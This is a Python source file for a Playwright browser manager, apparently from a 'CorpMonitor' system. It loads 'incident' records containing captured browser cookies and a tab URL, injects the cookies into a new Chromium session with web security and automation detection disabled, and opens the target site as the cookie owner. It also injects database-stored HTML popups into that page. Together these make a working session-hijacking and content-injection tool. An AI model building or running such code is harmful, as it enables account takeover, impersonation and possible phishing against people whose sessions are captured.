from playwright.async_api import async_playwright, Browser, BrowserContext, Page
from typing import Optional, Dict, List
import asyncio
import threading
from io import BytesIO
from PIL import Image
import json

class BrowserSession:
    def __init__(self, session_id: str, page: Page, browser: Browser, playwright, context: BrowserContext):
        self.session_id = session_id
        self.page = page
        self.browser = browser
        self.playwright = playwright
        self.context = context
        self.is_active = True

class BrowserManager:
    def __init__(self, supabase):
        self.supabase = supabase
        self.sessions: Dict[str, BrowserSession] = {}
        self.playwright_instance = None
        self._close_locks: Dict[str, asyncio.Lock] = {}  # Locks para evitar race condition
    
    @staticmethod
    def escape_js_string(text: str) -> str:
        """Escapar string para uso seguro em JavaScript"""
        return json.dumps(text)[1:-1]  # Remove aspas do JSON
    
    async def initialize(self):
        """Inicializar Playwright"""
        if not self.playwright_instance:
            try:
                print("[BrowserManager] Inicializando Playwright...")
                self.playwright_instance = await async_playwright().start()
                print("[BrowserManager] ✓ Playwright inicializado com sucesso")
            except Exception as e:
                print(f"[BrowserManager] ❌ Erro ao inicializar Playwright: {e}")
                print("[BrowserManager] Execute: python -m playwright install chromium")
                raise
    
    @staticmethod
    def normalize_same_site(value: str) -> str:
        """
        Normalizar valor de sameSite para formato do Playwright.
        Chrome usa: no_restriction, unspecified, lax, strict, none
        Playwright espera: None, Lax, Strict
        """
        if not value or value.lower() in ["unspecified", "no_restriction"]:
            return "None"
        
        # Capitalizar primeira letra (lax -> Lax, strict -> Strict)
        normalized = value.capitalize()
        
        # Validar que está nos valores aceitos
        if normalized not in ["Strict", "Lax", "None"]:
            return "Lax"  # Valor padrão seguro
        
        return normalized
    
    async def start_session(self, incident: Dict, interactive: bool = False) -> tuple[Optional[str], Optional[bytes]]:
        """
        Iniciar nova sessão do browser com os dados do incidente.
        Se interactive=True, abre browser visível para navegação manual.
        Retorna tuple (session_id, screenshot_bytes) ou (None, None) em caso de erro.
        """
        import time
        start_time = time.time()
        
        try:
            await self.initialize()
            
            # Extrair dados do incidente
            incident_id = incident.get("id")
            machine_id = incident.get("machine_id")
            target_url = incident.get("tab_url")
            cookies_raw = incident.get("full_cookie_data", [])
            
            print(f"[BrowserManager] Iniciando sessão para incidente {incident_id}")
            print(f"[BrowserManager] URL: {target_url}")
            print(f"[BrowserManager] Cookies: {len(cookies_raw)} cookies")
            
            # Iniciar browser Chromium (sempre novo processo se interativo)
            if interactive:
                print(f"[BrowserManager] Lançando novo browser Chromium (interativo)...")
                browser = await self.playwright_instance.chromium.launch(
                    headless=False,
                    args=[
                        '--start-maximized',
                        '--disable-blink-features=AutomationControlled'
                    ]
                )
                print(f"[BrowserManager] ✓ Browser iniciado")
            else:
                browser = await self.playwright_instance.chromium.launch(
                    headless=True,
                    args=[
                        '--disable-blink-features=AutomationControlled',
                        '--disable-web-security',
                        '--disable-features=IsolateOrigins,site-per-process'
                    ]
                )
            
            print(f"[BrowserManager] ✓ Browser inicializado")
            
            # Criar contexto com configurações
            context = await browser.new_context(
                viewport={'width': 1280, 'height': 720},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                ignore_https_errors=True,
                java_script_enabled=True
            )
            print(f"[BrowserManager] ✓ Contexto criado (viewport: 1280x720)")
            
            # Injetar cookies
            if cookies_raw:
                cookies = []
                for c in cookies_raw:
                    raw_same_site = c.get("sameSite", "Lax")
                    normalized_same_site = self.normalize_same_site(raw_same_site)
                    
                    if raw_same_site != normalized_same_site:
                        print(f"[BrowserManager] Cookie '{c.get('name')}': sameSite normalizado de '{raw_same_site}' para '{normalized_same_site}'")
                    
                    cookie = {
                        "name": c.get("name", ""),
                        "value": c.get("value", ""),
                        "domain": c.get("domain", ""),
                        "path": c.get("path", "/"),
                        "expires": c.get("expirationDate", -1),
                        "httpOnly": c.get("httpOnly", False),
                        "secure": c.get("secure", False),
                        "sameSite": normalized_same_site
                    }
                    cookies.append(cookie)
                
                print(f"[BrowserManager] Injetando {len(cookies)} cookies...")
                await context.add_cookies(cookies)
                print(f"[BrowserManager] ✓ {len(cookies)} cookies injetados com sucesso")
            
            # Aplicar bloqueios de domínios
            print(f"[BrowserManager] Aplicando bloqueios de domínio...")
            await self._apply_domain_blocks(context)
            
            # Criar nova página
            page = await context.new_page()
            
            # Navegar para URL
            print(f"[BrowserManager] Navegando para {target_url}...")
            await page.goto(target_url, wait_until='domcontentloaded', timeout=60000)
            print(f"[BrowserManager] ✓ Página carregada")
            
            # Aguardar carregamento adicional
            await page.wait_for_timeout(2000)
            
            # Capturar screenshot (apenas em modo headless)
            screenshot_bytes = None
            if not interactive:
                print(f"[BrowserManager] Capturando screenshot...")
                screenshot_bytes = await page.screenshot(full_page=False, type='png')
                print(f"[BrowserManager] ✓ Screenshot capturado ({len(screenshot_bytes)} bytes)")
            else:
                print(f"[BrowserManager] Modo interativo: navegador permanece aberto para navegação manual")
            
            # Criar sessão
            session_id = f"session-{incident_id}"
            session = BrowserSession(session_id, page, browser, self.playwright_instance, context)
            self.sessions[session_id] = session
            
            elapsed = time.time() - start_time
            mode_msg = "disponível para interação" if interactive else f"criada com sucesso em {elapsed:.2f}s"
            print(f"[BrowserManager] ✓ Sessão {session_id} {mode_msg}")
            
            return session_id, screenshot_bytes
            
        except Exception as e:
            print(f"[BrowserManager] ❌ Erro ao iniciar sessão: {e}")
            import traceback
            traceback.print_exc()
            return None, None
    
    async def open_interactive_browser(self, incident: Dict) -> Optional[str]:
        """
        Abrir navegador interativo (visível) para o usuário navegar manualmente.
        Retorna session_id ou None se falhar.
        """
        try:
            session_id, _ = await self.start_session(incident, interactive=True)
            
            if session_id:
                print(f"[BrowserManager] ✓ Navegador interativo aberto (sessão: {session_id})")
                print(f"[BrowserManager] ℹ️  Feche a janela de controle para encerrar a sessão")
            
            return session_id
        except Exception as e:
            print(f"[BrowserManager] ❌ Erro ao abrir navegador interativo: {e}")
            import traceback
            traceback.print_exc()
            return None
    
    async def _apply_domain_blocks(self, context: BrowserContext):
        """Aplicar bloqueios de domínios ativos"""
        try:
            response = self.supabase.table("blocked_domains")\
                .select("domain")\
                .eq("is_active", True)\
                .execute()
            
            if response.data:
                blocked_domains = [d["domain"] for d in response.data]
                print(f"[BrowserManager] Bloqueando {len(blocked_domains)} domínios")
                
                async def handle_route(route):
                    url = route.request.url
                    if any(bd in url for bd in blocked_domains):
                        print(f"[BrowserManager] ❌ Bloqueado: {url}")
                        await route.abort()
                    else:
                        await route.continue_()
                
                await context.route("**/*", handle_route)
        except Exception as e:
            print(f"[BrowserManager] Erro ao aplicar bloqueios: {e}")
    
    async def navigate(self, session_id: str, url: str) -> Optional[bytes]:
        """Navegar para nova URL"""
        try:
            session = self.sessions.get(session_id)
            if not session or not session.is_active:
                print(f"[BrowserManager] Sessão {session_id} não encontrada")
                return None
            
            print(f"[BrowserManager] Navegando para {url}")
            await session.page.goto(url, wait_until='domcontentloaded', timeout=30000)
            await session.page.wait_for_timeout(1000)
            
            screenshot_bytes = await session.page.screenshot(full_page=False)
            return screenshot_bytes
        except Exception as e:
            print(f"[BrowserManager] Erro ao navegar: {e}")
            return None
    
    async def click(self, session_id: str, selector: str) -> Optional[bytes]:
        """Clicar em elemento"""
        try:
            session = self.sessions.get(session_id)
            if not session or not session.is_active:
                return None
            
            await session.page.click(selector)
            await session.page.wait_for_timeout(1000)
            
            screenshot_bytes = await session.page.screenshot(full_page=False)
            return screenshot_bytes
        except Exception as e:
            print(f"[BrowserManager] Erro ao clicar: {e}")
            return None
    
    async def get_screenshot(self, session_id: str) -> Optional[bytes]:
        """Capturar screenshot atual"""
        try:
            session = self.sessions.get(session_id)
            if not session or not session.is_active:
                return None
            
            # Verificar se página ainda está aberta
            if session.page.is_closed():
                print(f"[BrowserManager] Página da sessão {session_id} já está fechada")
                return None
            
            screenshot_bytes = await session.page.screenshot(full_page=False)
            return screenshot_bytes
        except Exception as e:
            print(f"[BrowserManager] Erro ao capturar screenshot: {e}")
            return None
    
    async def inject_popup(self, session_id: str, template_id: str) -> bool:
        """Injetar popup customizado na página"""
        try:
            session = self.sessions.get(session_id)
            if not session or not session.is_active:
                return False
            
            # Buscar template do Supabase
            template_response = self.supabase.table("popup_templates")\
                .select("*")\
                .eq("id", template_id)\
                .single()\
                .execute()
            
            if not template_response.data:
                print("[BrowserManager] Template não encontrado")
                return False
            
            template = template_response.data
            html_content = template.get("html_content", "")
            css_styles = template.get("css_styles", "")
            
            # Escapar conteúdo para prevenir XSS
            html_escaped = self.escape_js_string(html_content)
            css_escaped = self.escape_js_string(css_styles)
            
            # Injetar popup via JavaScript
            js_code = f"""
            (function() {{
                const overlay = document.createElement('div');
                overlay.id = 'corpmonitor-popup-overlay';
                overlay.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 999999; display: flex; align-items: center; justify-content: center;';
                
                const popup = document.createElement('div');
                popup.id = 'corpmonitor-popup';
                popup.innerHTML = "{html_escaped}";
                
                const style = document.createElement('style');
                style.textContent = "{css_escaped}";
                
                overlay.appendChild(popup);
                document.body.appendChild(style);
                document.body.appendChild(overlay);
                
                console.log('[CorpMonitor] Popup injetado');
            }})();
            """
            
            await session.page.evaluate(js_code)
            print(f"[BrowserManager] Popup {template_id} injetado com sucesso")
            
            return True
        except Exception as e:
            print(f"[BrowserManager] Erro ao injetar popup: {e}")
            return False
    
    async def close_session(self, session_id: str):
        """Fechar uma sessão específica completamente (page, context e browser)"""
        if session_id not in self.sessions:
            print(f"[BrowserManager] Sessão {session_id} não encontrada")
            return
        
        # Criar lock se não existir
        if session_id not in self._close_locks:
            self._close_locks[session_id] = asyncio.Lock()
        
        # Adquirir lock para evitar race condition
        async with self._close_locks[session_id]:
            # Verificar novamente se sessão ainda existe
            if session_id not in self.sessions:
                return
            
            session = self.sessions[session_id]
            
            try:
                # Fechar página
                if session.page and not session.page.is_closed():
                    try:
                        await session.page.close()
                        print(f"[BrowserManager] ✓ Página da sessão {session_id} fechada")
                    except Exception as e:
                        if "closed" not in str(e).lower():
                            print(f"[BrowserManager] Aviso ao fechar página: {e}")
                
                # Fechar contexto
                if session.context:
                    try:
                        await session.context.close()
                        print(f"[BrowserManager] ✓ Contexto da sessão {session_id} fechado")
                    except Exception as e:
                        if "closed" not in str(e).lower():
                            print(f"[BrowserManager] Aviso ao fechar contexto: {e}")
                
                # Fechar browser completamente
                if session.browser:
                    try:
                        await session.browser.close()
                        print(f"[BrowserManager] ✓ Browser da sessão {session_id} encerrado")
                    except Exception as e:
                        if "closed" not in str(e).lower():
                            print(f"[BrowserManager] Aviso ao fechar browser: {e}")
                
                # Aguardar liberação de recursos
                await asyncio.sleep(0.2)
                
                # Marcar sessão como inativa e remover do mapa
                session.is_active = False
                del self.sessions[session_id]
                
            except Exception as e:
                print(f"[BrowserManager] Erro ao fechar sessão {session_id}: {e}")
            finally:
                # Remover lock após conclusão
                if session_id in self._close_locks:
                    del self._close_locks[session_id]
    
    async def close_all_sessions(self):
        """Fechar todas as sessões ativas"""
        session_ids = list(self.sessions.keys())
        for session_id in session_ids:
            try:
                await self.close_session(session_id)
            except Exception as e:
                print(f"[BrowserManager] Erro ao fechar sessão {session_id}: {e}")
        
        # Encerrar Playwright ao final
        if self.playwright_instance:
            try:
                await self.playwright_instance.stop()
                print(f"[BrowserManager] ✓ Playwright encerrado")
            except:
                pass
            self.playwright_instance = None
